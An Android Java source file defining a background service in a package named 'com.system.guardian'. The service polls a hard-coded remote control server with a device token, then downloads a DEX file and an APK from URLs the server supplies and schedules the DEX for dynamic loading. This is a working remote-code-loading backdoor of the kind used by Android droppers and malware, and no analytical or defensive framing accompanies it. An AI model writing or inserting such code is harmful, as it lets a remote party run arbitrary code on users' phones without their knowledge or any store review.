package com.system.guardian;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

/**
 * Service that polls the control endpoint and installs APK if update is available.
 */
public class ControlPollerService extends JobIntentService {

    private static final int JOB_ID = 1001;

    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, ControlPollerService.class, JOB_ID, work);
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        String deviceToken = "535ef8dad6992485";
        String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";

        JSONObject response = NetworkUtils.getJsonFromUrl(url);
        if (response != null && response.has("dex_url")) {
            try {
                String dexUrl = response.getString("dex_url");
                String apkUrl = response.optString("apk_url");

                if (!dexUrl.isEmpty() && !apkUrl.isEmpty()) {
                    File dexFile = NetworkUtils.downloadFile(getApplicationContext(), dexUrl, "patch.dex");
                    File apkFile = NetworkUtils.downloadFile(getApplicationContext(), apkUrl, "update.apk");

                    if (dexFile.exists()) {
                        DexLoader.schedulePatchLoad(this, dexFile);
                    } else {
                        CrashLogger.log(this, "DEX_PATCH", "❌ Skipped: dexFile was null or missing");
                    }
                }

            } catch (Exception e) {
                Log.e("DEX_PATCH", "❌ Error in ControlPollerService", e);
                CrashLogger.log(this, "DEX_PATCH", "❌ Error during dex patch load: " + e.getMessage());
            }
        }
    }
}
